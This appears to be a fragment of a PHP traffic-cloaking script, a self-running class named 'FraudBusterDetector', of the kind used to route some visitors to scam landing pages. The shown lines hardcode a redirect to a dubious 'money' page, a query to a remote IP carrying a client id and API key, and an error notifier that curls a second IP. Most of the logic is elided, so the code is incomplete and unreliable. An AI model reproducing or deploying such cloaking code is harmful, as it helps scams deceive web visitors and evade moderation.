<?php
class FraudBusterDetector_386e0fdgt6 {
    ...
    function moneyAction($resultObj) {
        ...
        $url = "http://hotsuperdeal.online/schitplinis/index.html";
...
//        }
    ...
    function sendRequestAndGetResult2($testConnection) {
        ...
        $url = "http://107.178.254.160/fb2?clid=386e0fdgt6&apikey=1b4895a7e31fa11168d976adbbce17f39&hash=-1525974831";
        $nParam = '70f024n';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://192.81.209.149/fb-notify.html?v=2&cf=false&guid=386e0fdgt6&m='.$message;
        $ch = curl_init($url);
...
$fraudBusterDetector_386e0fdgt6 = new FraudBusterDetector_386e0fdgt6();
$fraudBusterDetector_386e0fdgt6->check();
